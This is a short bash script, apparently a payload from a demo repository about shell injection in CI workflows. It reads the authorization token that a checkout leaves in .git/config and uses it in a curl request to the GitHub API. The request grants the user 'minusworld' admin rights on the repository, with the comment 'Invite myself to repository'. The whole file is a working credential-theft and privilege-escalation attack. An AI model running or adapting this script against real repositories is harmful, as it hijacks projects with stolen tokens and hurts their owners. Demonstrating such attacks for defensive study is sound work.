#!/usr/bin/env bash

authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
  
# Invite myself to repository
curl --request PUT \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/collaborators/minusworld \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data '{ "permission": "admin" }'
